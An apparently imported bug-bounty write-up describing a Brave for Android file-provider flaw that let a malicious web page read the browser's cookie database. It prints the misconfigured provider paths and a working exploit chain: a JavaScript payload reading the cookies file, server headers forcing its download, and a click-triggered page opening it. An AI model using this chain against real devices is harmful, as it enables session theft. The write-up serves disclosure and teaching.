---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-22_brave-stealing-your-cookies-remotely.md
original_filename: 2021-04-22_brave-stealing-your-cookies-remotely.md
title: Brave — Stealing your cookies remotely
category: documents
detected_topics:
- command-injection
- mobile-security
tags:
- imported
- documents
- command-injection
- mobile-security
language: en
raw_sha256: 2ee78feb48ffde8b3e39315a3510830eb0b49c635949af91dc528c726ef57fb1
text_sha256: d0641b90fec914899ba25d78283d57527523760f1488c436eb45ddc195ff489a
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Brave — Stealing your cookies remotely

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-22_brave-stealing-your-cookies-remotely.md
- Source Type: markdown
- Detected Topics: command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `2ee78feb48ffde8b3e39315a3510830eb0b49c635949af91dc528c726ef57fb1`
- Text SHA256: `d0641b90fec914899ba25d78283d57527523760f1488c436eb45ddc195ff489a`


## Content

---
title: "Brave — Stealing your cookies remotely"
url: "https://infosecwriteups.com/brave-stealing-your-cookies-remotely-1e09d1184675"
authors: ["Pedro Oliveira (@kanytu)"]
programs: ["Brave Software"]
bugs: ["Arbitrary file read"]
bounty: "500"
publication_date: "2021-04-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3712
scraped_via: "browseros"
---

# Brave — Stealing your cookies remotely

Brave — Stealing your cookies remotely
Pedro Oliveira
Follow
4 min read
·
Apr 22, 2021

232

Press enter or click to view image in full size

Brave for Android had a vulnerability that allowed a malicious web page to steal your cookies remotely. The vulnerability was reported through HackerOne and took 5 months to fix.

Introduction

During my research with Android applications, I found a few vulnerabilities in some of the most used browsers. When researching Brave, I noticed that it was using a Content Provider that was exposing all files from the public directory as well as its private files.

To deal with files, most Android applications use a File Provider. This allows files to be accessed with a content:// schemed URI. To configure a File Provider in Android, Brave declared the following in its AndroidManifest.xml file:

<provider android:name="org.chromium.chrome.browser.util.ChromeFileProvider" android:exported="false" android:authorities="com.brave.browser.FileProvider" android:grantUriPermissions="true">
  <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
</provider>

And in its file_paths.xml, which is where it's stored the available file information of this provider, Brave had the following:

<paths>
  <root-path name="root" path="." />
  <files-path name="images" path="images/" />
  <cache-path name="cache" path="net-export/" />
  <cache-path name="passwords" path="passwords/" />
  <cache-path name="traces" path="traces/" />
  <cache-path name="webapk" path="webapks/" />
  <cache-path name="offline-cache" path="Offline Pages/archives/" />
  <external-path name="downloads" path="Download/" />
  <external-path name="downloads" path="Android/data/com.brave.browser/files/Download/" />
</paths>

I immediately saw the root folder configuration with the combination of root-path and .which means that the home directory, /, is available. This includes /sdcard/ as well as /data/.

Most browsers support reading content:// directly. This is useful for opening local HTML pages or PDF files for example. Brave supports this too, so opening a content://URL in Brave will render the file in the browser.

Since Brave exposes its own private folder, /data/data/com.brave.browser/, we can order Brave to open its own cookies file, content://com.brave.browser.FileProvider/root/data/data/com.brave.browser/app_chrome/Default/Cookies , to see what happens:

Brave downloads binary files from content:// URLs

It downloads the file. By itself, this is already a vulnerability. This would allow a malicious application to order Brave to open this Content URI, wait a moment for Brave to download the file, and then retrieve it from the Downloads directory, which is a public directory, available to all applications with STORAGE permissions.

At this time, I reported the vulnerability through HackerOne to the Brave team. The next day, I was wondering if I could escalate this vulnerability to “remote”, by finding a way to steal the file from downloads.

I noticed that there was a cross-file protection issue with content:// providers and iframes that allowed an HTML file loaded through a content:// URI to load another file from another content:// URI provided that the authority is the same.

I decided to chain this weakness with the previous vulnerability to have a malicious web page generate a malicious HTML file that steals the cookies from the device.

The malicious web page would first need to trigger a download of a malicious HTML file. The contents of the malicious HTML file would be:

<script type="text/javascript">
​
  var request = new XMLHttpRequest();
  request.open("GET", "content://com.brave.browser.FileProvider/root/data/data/com.brave.browser/app_chrome/Default/Cookies", true);
  request.send(null);
  request.onreadystatechange = function() {
  if (request.readyState == 4) alert("Sending cookies to attacker: " + request.responseText);
  };
​
</script>
</html>

This will load the contents of content://com.brave.browser.FileProvider/root/data/data/com.brave.browser/app_chrome/Default/Cookies and print it in an alert modal. In a real attack scenario, the contents would be sent to a malicious server.

Get Pedro Oliveira’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The malicious page, after loaded, will trigger the download of the above file, which will be saved under /sdcard/Download/new_file.html.

self.send_response(200)
self.send_header("Content-Type", "application/octet-stream")
self.send_header("content-disposition", "attachment; filename=new_file.html")
self.end_headers()

Because Brave doesn’t allow another page to be opened without user interaction right after you open a new one, I added a click listener that would trigger when the user tapped on any place of the web page:

<iframe src="/download_page.html" style="width:0;height:0;border:0; border:none;"></iframe>
​
<button id="myCheck" onclick="window.open('android-app://com.brave.browser/content/com.brave.browser.FileProvider/root/sdcard/Download/new_file.html#Intent;type=text/html;end');">
​
<script>
  document.addEventListener('click', function (event) {
  document.removeEventListener('click', this, false);
  document.getElementById("myCheck").click();
  }, false);
</script>
</html>

The iframe will trigger the download of the malicious HTML file, then I created the listener to wait for click events.

When the user taps on the screen, the malicious HTML will open and trigger the exploit.

Full exploit showing cookies database contents
Conclusion

Even though this requires user interaction, it’s not a rare scenario to tap on a web page and the user can be tricked in many ways to do so. I updated my initial report with this new exploit the next day, which raised the severity of the issue to Critical.

Timeline
May 16th, 2020 — Initial report to HackerOne
May 17th, 2020 — Remote exploit reported
Jun 2nd, 2020 — Fix started
Jun 16th, 2020 — Fix deployed
Jun 18th, 2020 — Bounty assigned ($500)
Aug 29th, 2020 — Report reopened due to a regression
Oct 23rd, 2020 — Fix re-deployed

Brave resolved the issue in v1.12.32, approximately 1 month after the initial report. However, this fix was reverted due to a regression in the way Brave dealt with local PDF files in v1.13.87. The final fix was then deployed 5 months after the initial report in v1.18.5.

You can read the full disclosed report here.

This write-up is a part of series of vulnerabilities I found in 2020 on Android browsers. If you liked this one, you can read about a similar vulnerability I found in Firefox here on how a website could steal all of your cookies. Stay tuned for future write-ups on other browsers!

Cheers,

Twitter: @kanytu

LinkedIn: www.linkedin.com/in/kanytu
